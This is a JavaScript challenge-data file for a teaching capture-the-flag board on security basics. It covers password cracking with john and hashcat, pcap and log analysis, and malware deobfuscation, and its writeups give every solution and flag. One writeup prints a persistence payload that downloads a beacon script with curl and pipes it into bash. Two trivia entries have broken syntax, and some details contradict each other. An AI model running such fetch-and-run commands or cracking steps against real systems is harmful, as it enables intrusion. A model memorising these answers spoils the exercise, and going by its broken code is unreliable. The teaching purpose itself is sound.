/*
 * challenges.js - the challenge board data.
 * This is THE file you edit to add a challenge.
 *
 * Every flag is stored as a salted SHA-256 hash, never in plain text:
 *     hash = SHA256( salt + "::" + answer )
 * The salt lives in js/config.js. Generate the hash with tools/hash.html.
 *
 * Field reference
 *   id            unique slug (used as the localStorage key)
 *   title         short name shown on the card
 *   topic         one of the ids in CTF_CONFIG.topics
 *   difficulty    easy | average | difficult | trivia
 *   points        awarded before hints are used
 *   description   what the player has to do (plain text, no HTML)
 *   files         downloadable artefacts, relative to the site root
 *   hints         exactly 3 hints, unlocked in order, each one costs points
 *   caseSensitive true = the answer is compared byte for byte
 *   tools         recommended Kali Linux tooling
 *   writeup       step by step solution with the exact commands
 */
window.CTF_CHALLENGES = [
  {
    id: "esp-base64-rot13",
    title: "Layered Encoding: Base64 + ROT13",
    category: "Essential Security Principles",
    topic: "Encoding & obfuscation",
    link: "writeups.html#area-essential",
    difficulty: "easy",
    points: 50,
    description:
      "A vendor configuration blob was recovered from a decommissioned web server. " +
      "The value is Base64 encoded and, inside it, the flag was shifted with ROT13 " +
      "(every letter moved 13 places in the alphabet). Decode the Base64, undo the " +
      "shift, and you have the flag. Everything works from the Kali shell.",
    files: ["files/esp_base64_rot13.txt"],
    hints: [
      { text: "Base64 comes first: cut the VALUE= prefix and run `base64 -d`. The output still does not look like a flag.", cost: 20 },
      { text: "ROT13 shifts letters by 13 places: `echo <text> | tr 'A-Za-z' 'N-ZA-Mn-za-m'` or `rot13 <text>`.", cost: 20 },
      { text: "The decoded and shifted text starts with CTF{ and ends with }.", cost: 20 }
    ],
    caseSensitive: true,
    tools: ["base64", "tr", "python3", "cyberchef"],
    writeup:
      "1. Read the blob:\n" +
      "   $ cat files/esp_base64_rot13.txt\n" +
      "   VALUE=UEdTe29uZnI2NF9ndXJhX2ViZzEzfQ==\n" +
      "2. Decode the Base64 layer:\n" +
      "   $ grep VALUE files/esp_base64_rot13.txt | cut -d= -f2 | base64 -d\n" +
      "   PGS{onfr64_gura_ebg13}\n" +
      "3. Undo the ROT13 layer:\n" +
      "   $ echo 'PGS{onfr64_gura_ebg13}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n" +
      "   CTF{base64_then_rot13}\n" +
      "Learning point: encoding is not encryption. Base64 and ROT13 are reversible by " +
      "design and must never be used to protect secrets."
  },
  {
    id: "esp-hash-md5",
    title: "Hash Detective",
    category: "Essential Security Principles",
    topic: "Hashing",
    link: "writeups.html#area-essential",
    difficulty: "easy",
    points: 50,
    description:
      "Three password hashes were recovered from a compromised workstation. The " +
      "usernames were lost. Identify which hash is the MD5 one from its length, crack " +
      "it with the supplied wordlist (john the ripper or hashcat) and submit the " +
      "cracked password as CTF{<password>}.",
    files: ["files/esp_md5_hashes.txt", "files/esp_wordlist.txt"],
    hints: [
      { text: "MD5 is 32 hexadecimal characters, SHA-1 is 40 and SHA-256 is 64.", cost: 20 },
      { text: "Crack it with john: `john --format=raw-md5 --wordlist=files/esp_wordlist.txt files/esp_md5_hashes.txt`. hashcat alternative: `hashcat -m 0 files/esp_md5_hashes.txt files/esp_wordlist.txt`.", cost: 20 },
      { text: "The cracked password is Swordfish - submit it as CTF{Swordfish}.", cost: 20 }
    ],
    caseSensitive: true,
    tools: ["hashid", "john", "hashcat", "md5sum"],
    writeup:
      "1. Identify the hash types:\n" +
      "   $ cat files/esp_md5_hashes.txt\n" +
      "   $ awk '{print length($0), $0}' files/esp_md5_hashes.txt\n" +
      "   32 <md5>   40 <sha1>   64 <sha256>\n" +
      "   hashid can confirm: `hashid <hash>`\n" +
      "2. Crack the MD5 hash with the provided wordlist:\n" +
      "   $ john --format=raw-md5 --wordlist=files/esp_wordlist.txt files/esp_md5_hashes.txt\n" +
      "   $ john --show --format=raw-md5 files/esp_md5_hashes.txt\n" +
      "3. The recovered password is Swordfish, so the flag is CTF{Swordfish}.\n" +
      "Learning point: unsalted MD5 is far too fast to be used for passwords and is " +
      "trivial to brute force with a wordlist."
  },
  {
    id: "esp-shadow-john",
    title: "Cracking the Shadow File",
    category: "Essential Security Principles",
    topic: "Password security",
    link: "writeups.html#area-essential",
    difficulty: "average",
    points: 100,
    description:
      "A copy of /etc/shadow was recovered from the lab web server (10.0.0.5). The " +
      "hashes use crypt(3) MD5 ($1$). Crack the deploy account with the supplied " +
      "wordlist - the recovered password is the flag. Use john or hashcat; the file " +
      "format is detected automatically.",
    files: ["files/esp_shadow.txt", "files/esp_passwords.txt"],
    hints: [
      { text: "john detects the shadow file itself: `john --wordlist=files/esp_passwords.txt files/esp_shadow.txt`.", cost: 60 },
      { text: "hashcat alternative for crypt(3) MD5: `hashcat -m 500 -a 0 files/esp_shadow.txt files/esp_passwords.txt`.", cost: 60 },
      { text: "Only the deploy account is crackable with this wordlist - its password becomes the flag.", cost: 60 }
    ],
    caseSensitive: true,
    tools: ["john", "hashcat", "unshadow", "chpasswd"],
    writeup:
      "1. Look at the recovered shadow file:\n" +
      "   $ cat files/esp_shadow.txt\n" +
      "   deploy:$1$olymp1c$SLJRoqiX0ebqZrWcTLs52/:19812:0:99999:7:::\n" +
      "2. Crack it:\n" +
      "   $ john --wordlist=files/esp_passwords.txt files/esp_shadow.txt\n" +
      "   $ john --show files/esp_shadow.txt\n" +
      "   deploy:Sunflower!2026\n" +
      "3. The flag is CTF{Sunflower!2026}.\n" +
      "Learning point: /etc/shadow must stay root readable only (chmod 640, owned by " +
      "root:shadow), and modern systems use yescrypt/bcrypt ($y$, $2b$) instead of $1$."
  },
  {
    id: "esp-xor-key",
    title: "Repeating-Key XOR",
    category: "Essential Security Principles",
    topic: "Encryption",
    link: "writeups.html#area-essential",
    difficulty: "average",
    points: 100,
    description:
      "The configuration blob was protected with a repeating-key XOR cipher. The key is " +
      "written in the header of the file. Convert the hex payload to bytes, XOR it with " +
      "the repeating key and the plaintext (the flag) appears.",
    files: ["files/esp_xor.txt"],
    hints: [
      { text: "Hex to bytes first: `xxd -r -p files/esp_xor.txt > blob.bin`.", cost: 60 },
      { text: "XOR with a repeating key: `python3 -c \"d=open('blob.bin','rb').read();k=b'olympics';print(bytes(b^k[i%len(k)] for i,b in enumerate(d)).decode())\"`.", cost: 60 },
      { text: "The plaintext you get is already the flag - do not add another CTF{} wrapper.", cost: 60 }
    ],
    caseSensitive: true,
    tools: ["xxd", "python3", "openssl", "binwalk"],
    writeup:
      "1. Convert the hex to raw bytes:\n" +
      "   $ tail -n 1 files/esp_xor.txt | xxd -r -p > blob.bin\n" +
      "2. XOR with the repeating key 'olympics':\n" +
      "   $ python3 - <<'PY'\n" +
      "   data = open('blob.bin','rb').read()\n" +
      "   key  = b'olympics'\n" +
      "   out  = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))\n" +
      "   print(out.decode())\n" +
      "   PY\n" +
      "   CTF{xor_is_not_encryption}\n" +
      "3. The plaintext is the flag: CTF{xor_is_not_encryption}.\n" +
      "Learning point: XOR with a short repeating key is only obfuscation; it is broken " +
      "by known plaintext analysis and frequency statistics."
  },
  {
    id: "net-subnetting",
    title: "Subnetting 101",
    category: "Basic Network Setup and Security",
    topic: "IP addressing & subnetting",
    link: "writeups.html#area-network",
    difficulty: "easy",
    points: 50,
    description:
      "The lab router uses 192.168.10.77/26 on its LAN interface. Work out the network " +
      "address and the broadcast address of that subnet and submit them as " +
      "CTF{<network address>-<broadcast address>} (dash, no spaces). The IP plan of the " +
      "lab is attached.",
    files: ["files/net_subnet_plan.txt"],
    hints: [
      { text: "/26 borrows 6 bits for the subnet: the mask is 255.255.255.192 and the block size is 64.", cost: 20 },
      { text: "Network = floor(192.168.10.77 / 64) * 64 = 192.168.10.64, broadcast = network + 63 = 192.168.10.127.", cost: 20 },
      { text: "Join the two addresses with a dash: CTF{network-broadcast}.", cost: 20 }
    ],
    caseSensitive: true,
    tools: ["ipcalc", "ip", "python3", "netstat"],
    writeup:
      "1. Read the plan: the router LAN interface is 192.168.10.77/26.\n" +
      "2. /26 = 255.255.255.192, block size 64:\n" +
      "   $ ipcalc 192.168.10.77/26\n" +
      "   Address: 192.168.10.77\n" +
      "   Netmask: 255.255.255.192 = 26\n" +
      "   Network: 192.168.10.64\n" +
      "   Broadcast: 192.168.10.127\n" +
      "   HostMin: 192.168.10.65\n" +
      "   HostMax: 192.168.10.126\n" +
      "3. Flag: CTF{192.168.10.64-192.168.10.127}\n" +
      "Learning point: a /26 gives 62 usable hosts (2^6 - 2), which is why the DHCP " +
      "range in the plan stops at .126."
  },
  {
    id: "net-nmap-output",
    title: "Unexpected Open Service",
    category: "Basic Network Setup and Security",
    topic: "Ports & services",
    link: "writeups.html#area-network",
    difficulty: "easy",
    points: 50,
    description:
      "Here is the nmap service scan of the lab web server (plain text and XML). One of " +
      "the open services should never be exposed on an internet facing Linux web " +
      "server. The flag is the service name exactly as nmap prints it, wrapped in CTF{}.",
    files: ["files/net_nmap_scan.txt", "files/net_nmap_scan.xml"],
    hints: [
      { text: "Compare the list with what a normal web server exposes (21, 22, 25, 80, 443 ...).", cost: 20 },
      { text: "The odd one out is the Remote Desktop service on port 3389, reported as ms-wbt-server.", cost: 20 },
      { text: "Submit it in lower case: CTF{ms-wbt-server}.", cost: 20 }
    ],
    caseSensitive: true,
    tools: ["nmap", "grep", "xmlstarlet"],
    writeup:
      "1. Read the scan:\n" +
      "   $ cat files/net_nmap_scan.txt\n" +
      "   ... 3389/tcp  open  ms-wbt-server  Microsoft Terminal Server\n" +
      "2. The XML variant contains the same finding:\n" +
      "   $ grep -o 'ms-wbt-server' files/net_nmap_scan.xml\n" +
      "3. Flag: CTF{ms-wbt-server}\n" +
      "Learning point: RDP (3389) on a public host is a critical exposure - it gives " +
      "attackers an interactive session and is a top target for credential attacks."
  },
  {
    id: "net-pcap-ftp",
    title: "Cleartext FTP Credentials",
    category: "Basic Network Setup and Security",
    topic: "Packet analysis",
    link: "writeups.html#area-network",
    difficulty: "average",
    points: 100,
    description:
      "A packet capture from the lab shows a client pulling a report over FTP. FTP has no " +
      "encryption: the credentials travel in clear text inside the control channel. " +
      "Extract the password - it is the flag.",
    files: ["files/net_capture_login.pcap"],
    hints: [
      { text: "Open the capture in Wireshark, or from the shell: `tshark -r files/net_capture_login.pcap -Y ftp`.", cost: 60 },
      { text: "Follow the TCP stream of the control channel: `tshark -r files/net_capture_login.pcap -z follow,tcp,ascii,0`.", cost: 60 },
      { text: "The FTP PASS command carries the flag.", cost: 60 }
    ],
    caseSensitive: true,
    tools: ["wireshark", "tshark", "strings", "tcpflow"],
    writeup:
      "1. Filter the FTP control channel:\n" +
      "   $ tshark -r files/net_capture_login.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg\n" +
      "2. Or follow the stream:\n" +
      "   $ tshark -r files/net_capture_login.pcap -z follow,tcp,ascii,0 | grep PASS\n" +
      "   PASS CTF{ftp_plaintext_credentials}\n" +
      "3. Flag: CTF{ftp_plaintext_credentials}\n" +
      "Learning point: use SFTP/FTPS instead of FTP, disable anonymous login and rotate " +
      "any credential that was ever sent in clear text."
  },
  {
    id: "net-iptables",
    title: "Firewall Review",
    category: "Basic Network Setup and Security",
    topic: "Firewalls & hardening",
    link: "writeups.html#area-network",
    difficulty: "average",
    points: 100,
    description:
      "A dump of the perimeter firewall rules is attached (iptables-save format). The " +
      "default policy is DROP, but one rule exposes an internal database service to the " +
      "whole network. Submit the flag as CTF{<port>_<service>} using the port from the " +
      "rule and the service name from its comment.",
    files: ["files/net_firewall_rules.sh"],
    hints: [
      { text: "With an INPUT policy of DROP every explicit ACCEPT rule is a way in - list them: `grep '^-A INPUT' files/net_firewall_rules.sh`.", cost: 60 },
      { text: "The offending rule accepts tcp/3306 from anywhere and its comment names the service.", cost: 60 },
      { text: "Join port and service with an underscore: CTF{port_service}.", cost: 60 }
    ],
    caseSensitive: true,
    tools: ["iptables", "nft", "ufw", "grep"],
    writeup:
      "1. Review the rules:\n" +
      "   $ grep '^-A INPUT' files/net_firewall_rules.sh\n" +
      "   -A INPUT -p tcp --dport 3306 -j ACCEPT        # allow mysql replication from anywhere\n" +
      "2. Everything else is limited to 22/80/443; the database port is open to the world.\n" +
      "3. Flag: CTF{3306_mysql}\n" +
      "Learning point: bind database services to a management interface, restrict the " +
      "source networks and log what crosses the border."
  },
  {
    id: "net-pcap-dns",
    title: "DNS Exfiltration",
    category: "Basic Network Setup and Security",
    topic: "Packet analysis",
    link: "writeups.html#area-network",
    difficulty: "difficult",
    points: 150,
    description:
      "A workstation was suspected of tunnelling data out over DNS. The capture only " +
      "contains DNS traffic. The stolen data is split over several TXT records - rebuild " +
      "the payload in the right order, decode it and you get the flag.",
    files: ["files/net_dns_exfil.pcap"],
    hints: [
      { text: "Filter for DNS and look at TXT records (type 16), not A records: `tshark -r files/net_dns_exfil.pcap -Y 'dns.qry.type==16'`.", cost: 100 },
      { text: "Extract the values directly: `tshark -r files/net_dns_exfil.pcap -Y 'dns.qry.type==16' -T fields -e dns.txt`.", cost: 100 },
      { text: "Join the chunks in the order c1, c2, c3, c4 and base64 decode the result.", cost: 100 }
    ],
    caseSensitive: true,
    tools: ["wireshark", "tshark", "dnscat", "python3"],
    writeup:
      "1. List the DNS traffic:\n" +
      "   $ tshark -r files/net_dns_exfil.pcap -Y dns -T fields -e dns.qry.name -e dns.txt\n" +
      "   c1.chunk.exfil.local   Q0RGX2Ruc19leGZpbF9vdmVy\n" +
      "   c2.chunk.exfil.local   X2Rucyw=\n" +
      "   c3.chunk.exfil.local   ...\n" +
      "   c4.chunk.exfil.local   ...\n" +
      "2. Rebuild and decode:\n" +
      "   $ tshark -r files/net_dns_exfil.pcap -Y 'dns.qry.type==16' -T fields -e dns.txt | tr -d '\\n' | base64 -d; echo\n" +
      "   CTF{dns_exfil_over_dns}\n" +
      "3. Flag: CTF{dns_exfil_over_dns}\n" +
      "Learning point: monitor DNS for high volume TXT/NULL queries, long random labels " +
      "and queries to a single unusual domain; force internal traffic through an " +
      "authoritative resolver you control."
  },
  {
    id: "end-authlog",
    title: "Brute Force in auth.log",
    category: "Endpoint Security Concepts",
    topic: "Logging & monitoring",
    link: "writeups.html#area-endpoint",
    difficulty: "easy",
    points: 50,
    description:
      "The Linux authentication log of the lab server shows a password spray from the " +
      "outside. Most lines are failed logins - one account was actually compromised. The " +
      "flag is CTF{<source IP>_<username>} built from the successful authentication line.",
    files: ["files/end_auth.log"],
    hints: [
      { text: "Failed logins say 'Failed password', the successful one says 'Accepted password'.", cost: 20 },
      { text: "Isolate it: `grep 'Accepted password' files/end_auth.log`.", cost: 20 },
      { text: "Combine IP and user name with an underscore: CTF{10.0.0.1_user}.", cost: 20 }
    ],
    caseSensitive: true,
    tools: ["grep", "awk", "journalctl", "fail2ban"],
    writeup:
      "1. Find the successful login:\n" +
      "   $ grep 'Accepted password' files/end_auth.log\n" +
      "   Oct 14 08:16:40 srv01 sshd[2162]: Accepted password for svc_backup from 192.168.56.42 port 51890 ssh2\n" +
      "2. Build the flag from the source address and the user name:\n" +
      "   CTF{192.168.56.42_svc_backup}\n" +
      "3. Flag: CTF{192.168.56.42_svc_backup}\n" +
      "Learning point: 192.168.56.42 also shows up in a failed attempt - successful " +
      "authentication is the important event. Deploy fail2ban, disable password " +
      "authentication and require keys plus MFA."
  },
  {
    id: "end-persistence",
    title: "Persistence Mechanism",
    category: "Endpoint Security Concepts",
    topic: "Persistence",
    link: "writeups.html#area-endpoint",
    difficulty: "average",
    points: 100,
    description:
      "An imaged laptop shows two persistence mechanisms: a root crontab and a systemd " +
      "unit. One of them carries a Base64 encoded payload. Decode the payload - the flag " +
      "is written inside the decoded command.",
    files: ["files/end_crontab.txt", "files/end_systemd.service"],
    hints: [
      { text: "Look for long Base64 blobs in both files: `grep -o '[A-Za-z0-9+/=]\\{20,\\}' files/end_crontab.txt files/end_systemd.service`.", cost: 60 },
      { text: "Decode both of them: `echo <blob> | base64 -d`. Only one contains the flag.", cost: 60 },
      { text: "The decoded command comments the flag at the end of the line.", cost: 60 }
    ],
    caseSensitive: true,
    tools: ["base64", "crontab -l", "systemctl", "grep"],
    writeup:
      "1. Find the encoded payload:\n" +
      "   $ grep -o '[A-Za-z0-9+/=]\\{20,\\}' files/end_crontab.txt files/end_systemd.service\n" +
      "   files/end_crontab.txt:*/5 * * * * /bin/bash -c 'echo <blob> | base64 -d | bash'\n" +
      "2. Decode it:\n" +
      "   $ grep -o '[A-Za-z0-9+/=]\\{20,\\}' files/end_crontab.txt | base64 -d\n" +
      "   /usr/bin/python3 -c \"import os; os.system('curl -s http://10.10.10.5/beacon.sh | bash')\" # CTF{cron_persistence_beacon}\n" +
      "3. Flag: CTF{cron_persistence_beacon}\n" +
      "Learning point: a cron job that pipes a downloaded script into bash is a textbook " +
      "persistence mechanism. Baseline the crontabs and unit files of every host."
  },
  {
    id: "end-obfuscated-script",
    title: "Deobfuscating the Maintenance Script",
    category: "Endpoint Security Concepts",
    topic: "Malware analysis",
    link: "writeups.html#area-endpoint",
    difficulty: "difficult",
    points: 150,
    description:
      "A 'maintenance' shell script keeps the flag in two Base64 encoded segments. Each " +
      "segment is additionally stored reversed. Reverse each segment and join segment A " +
      "with segment B - the flag appears.",
    files: ["files/end_obfuscated.sh"],
    hints: [
      { text: "Decode the segments first: `source files/end_obfuscated.sh` or `echo <blob> | base64 -d`.", cost: 100 },
      { text: "They come out backwards - use rev: `rev <<< \"$(echo <blob> | base64 -d)\"`.", cost: 100 },
      { text: "The flag is segment A followed by segment B (A first).", cost: 100 }
    ],
    caseSensitive: true,
    tools: ["base64", "rev", "python3", "strings"],
    writeup:
      "1. Look at the script:\n" +
      "   $ cat files/end_obfuscated.sh\n" +
      "   SEG_A='Y3N1ZmJvZWR7RlRD'\n" +
      "   SEG_B='fTczMzFfZW1fZXRh'\n" +
      "2. Decode and reverse both segments:\n" +
      "   $ echo Y3N1ZmJvZWR7RlRD | base64 -d | rev\n" +
      "   CTF{deobfusc\n" +
      "   $ echo fTczMzFfZW1fZXRh | base64 -d | rev\n" +
      "   ate_me_1337}\n" +
      "3. Join them (A first): CTF{deobfuscate_me_1337}\n" +
      "Learning point: obfuscation only slows an analyst down. Decode layers " +
      "mechanically and never trust a script you did not write - inspect it first."
  },
  {
    id: "end-image-hidden",
    title: "Image Forensics",
    category: "Endpoint Security Concepts",
    topic: "Forensics & steganography",
    link: "writeups.html#area-endpoint",
    difficulty: "difficult",
    points: 150,
    description:
      "A PNG file was recovered from a suspect's machine. There is more in the file than " +
      "the picture shows. Use the usual forensics tooling to find the hidden data - the " +
      "flag is embedded in the file.",
    files: ["files/end_secret.png"],
    hints: [
      { text: "`exiftool files/end_secret.png` prints the PNG text chunks - one of them holds the flag.", cost: 100 },
      { text: "`strings files/end_secret.png` shows it too, because the flag is appended after the IEND chunk.", cost: 100 },
      { text: "`binwalk files/end_secret.png` reveals the appended data past the PNG end marker.", cost: 100 }
    ],
    caseSensitive: true,
    tools: ["exiftool", "strings", "binwalk", "xxd", "pngcheck"],
    writeup:
      "1. Metadata:\n" +
      "   $ exiftool files/end_secret.png\n" +
      "   Comment  : CTF{image_metadata_leak}\n" +
      "2. Appended payload:\n" +
      "   $ strings files/end_secret.png | grep CTF\n" +
      "   CTF{image_metadata_leak}\n" +
      "   $ binwalk files/end_secret.png\n" +
      "   85 0 .. 143: PNG image data, 16 x 16, 8-bit/color RGB\n" +
      "   144 0 .. 205: PNG image data (something after IEND)\n" +
      "3. Flag: CTF{image_metadata_leak}\n" +
      "Learning point: strip metadata before publishing images and scan uploads for " +
      "appended data - both leak internal information."
  },
  {
    id: "vam-risk-matrix",
    title: "Scan Report Meets Risk Matrix",
    category: "Vulnerability Assessment and Risk Management",
    topic: "Risk management",
    link: "writeups.html#area-risk",
    difficulty: "difficult",
    points: 150,
    description:
      "You have a vulnerability scan report (CSV and XML) and an asset criticality list. " +
      "Turn the report into a risk ranking: map the CVSS severity of every finding to a " +
      "likelihood (Critical = 4, High = 3, Medium = 2, Low = 1) and multiply it with the " +
      "business impact of the affected asset from the criticality list. The finding with " +
      "the highest risk wins. Submit the flag as CTF{<ip address>_<CVE>}.",
    files: [
      "files/vam_scan_report.csv",
      "files/vam_scan_report.xml",
      "files/vam_asset_criticality.csv"
    ],
    hints: [
      { text: "The CSV is the easiest source: host,port,protocol,cve,plugin_name,severity,cvss_base_score.", cost: 100 },
      { text: "Risk = likelihood x impact. The finance database has the highest business impact (5) even though its CVSS score is lower than the web server's.", cost: 100 },
      { text: "The winner is the finding on 10.10.5.21 - use its CVE identifier (Log4Shell).", cost: 100 }
    ],
    caseSensitive: true,
    tools: ["csvlook", "grep", "xmllint", "nmap", "python3"],
    writeup:
      "1. Look at the findings:\n" +
      "   $ cat files/vam_scan_report.csv\n" +
      "   host,port,protocol,cve,plugin_name,severity,cvss_base_score\n" +
      "   10.10.5.12,443/tcp,tcp,CVE-2023-4863,...,Critical,9.8\n" +
      "   10.10.5.21,8080/tcp,tcp,CVE-2021-44228,...,High,8.1\n" +
      "   ...\n" +
      "2. And at the criticality of the assets:\n" +
      "   $ cat files/vam_asset_criticality.csv\n" +
      "   asset_id,ip_address,owner,business_impact,internet_exposed\n" +
      "   WEB-PUB,10.10.5.12,Marketing,3,yes\n" +
      "   DB-FIN,10.10.5.21,Finance,5,no\n" +
      "   MAIL-01,10.10.5.30,IT Operations,2,yes\n" +
      "   FILE-SRV,10.10.5.40,Human Resources,4,no\n" +
      "   JUMP-01,10.10.5.50,IT Operations,4,yes\n" +
      "3. Compute risk = likelihood x impact:\n" +
      "   10.10.5.12 CVE-2023-4863  4 x 3 = 12\n" +
      "   10.10.5.21 CVE-2021-44228  3 x 5 = 15   <-- highest\n" +
      "   10.10.5.30 CVE-2020-28017  4 x 2 = 8\n" +
      "   10.10.5.40 CVE-2019-19781  3 x 4 = 12\n" +
      "   10.10.5.50 CVE-2017-0144   2 x 4 = 8\n" +
      "4. Flag: CTF{10.10.5.21_CVE-2021-44228}\n" +
      "Learning point: a scan report is not a risk assessment. Severity alone does not " +
      "decide what to fix first - exposure and business impact decide."
  },
  {
    id: "trivia-cia",
    title: "Trivia: The CIA Triad",
    category: "Trivia",
    topic: "CIA triad",
    link: "writeups.html#area-trivia",
    difficulty: "trivia",
    points: 30,
    description:
      "Which three properties form the CIA triad of information security? Type the three " +
      "words separated by spaces. Case does not matter and the CTF{} wrapper is optional.",
    files: [],
    hints: [],
      "3d0841d864b977c16db3860fd0c0a0b7d8df6fc398bb012169667feb706ed74f",
      "4dc41b9c4fd6a6d6d2ef4cb5bc1ae784c3e64b5b42adbb5760abcd601f062197"
    ],
    caseSensitive: false,
    tools: [],
    writeup:
      "The three pillars are Confidentiality, Integrity and Availability. Confidentiality " +
      "keeps data secret (encryption, access control), integrity keeps it trustworthy " +
      "(hashing, signatures) and availability keeps it reachable (capacity, redundancy, " +
      "DDoS protection)."
  },
  {
    id: "trivia-ssh-port",
    title: "Trivia: Default SSH Port",
    category: "Trivia",
    topic: "Ports & services",
    link: "writeups.html#area-trivia",
    difficulty: "trivia",
    points: 30,
    description:
      "Which TCP port does SSH use by default? Type the number only.",
    files: [],
    hints: [],
    caseSensitive: false,
    tools: [],
    writeup:
      "SSH listens on TCP 22 by default (TCP/22 in /etc/services, or 'sshd -T | grep ^port'). " +
      "Moving it reduces the noise in logs but is not a control on its own."
  },
  {
    id: "trivia-https-port",
    title: "Trivia: Default HTTPS Port",
    category: "Trivia",
    topic: "Ports & services",
    link: "writeups.html#area-trivia",
    difficulty: "trivia",
    points: 30,
    description:
      "Which TCP port does HTTPS use by default? Type the number only.",
    files: [],
    hints: [],
    caseSensitive: false,
    tools: [],
    writeup:
      "HTTPS uses TCP 443 (HTTP 80). The port can be changed, but every browser and " +
      "tool expects 443 unless it is told otherwise."
  },
  {
    id: "trivia-nmap-sv",
    title: "Trivia: What Does nmap -sV Do?",
    category: "Trivia",
    topic: "Tooling",
    link: "writeups.html#area-trivia",
    difficulty: "trivia",
    points: 30,
    description:
      "What does the nmap option -sV do? Answer in a few words. Case does not matter and " +
      "the CTF{} wrapper is optional.",
    files: [],
    hints: [],
      "a2b011885c459daa478dcc7878b0538fffbd3fdc5c9f772f0ae37ecf786cdda2",
      "e9b8478eec07ccf92454095f79df8cd2d1fa7393708c7ca43defbd918be2fad7",
      "196d726dd7470d9b63452d7e5ea0ebaac62864330c4acfc5e1156e95c3174a87"
    ],
    caseSensitive: false,
    tools: [],
    writeup:
      "-sV performs service version detection: nmap probes the open ports and tries to " +
      "identify the software and version behind them. It is much slower than a plain " +
      "port scan, so use it selectively."
  },
  {
    id: "trivia-cvss",
    title: "Trivia: What Does CVSS Stand For?",
    category: "Trivia",
    topic: "Vulnerability management",
    link: "writeups.html#area-trivia",
    difficulty: "trivia",
    points: 30,
    description:
      "What does the abbreviation CVSS stand for? Answer with the full phrase. Case does " +
      "not matter and the CTF{} wrapper is optional.",
    files: [],
    hints: [],
    caseSensitive: false,
    tools: [],
    writeup:
      "CVSS = Common Vulnerability Scoring System. The base score (0-10) is built from " +
      "the attack vector, complexity, privileges required, user interaction and " +
      "impact. Always combine it with the business context of the asset."
  },
  {
    id: "tb-vuln-vs-threat",
    title: "Tiebreaker: Vulnerability or Threat?",
    category: "Trivia",
    topic: "Risk management",
    link: "writeups.html#area-trivia",
    difficulty: "average",
    points: 100,
    description:
      "TIEBREAKER - this challenge is not counted in the total score, it only decides " +
      "who ranks higher when two teams finish with the same number of points. Which " +
      "term describes a weakness in a system that can be exploited to compromise it? " +
      "Answer with the single word.",
    files: [],
    hints: [],
    caseSensitive: false,
    tools: [],
    writeup:
      "A vulnerability is the weakness itself (unpatched software, weak permissions, " +
      "misconfiguration); a threat is the potential actor or event that wants to " +
      "exploit it; the risk is the combination of likelihood and impact."
  }
];
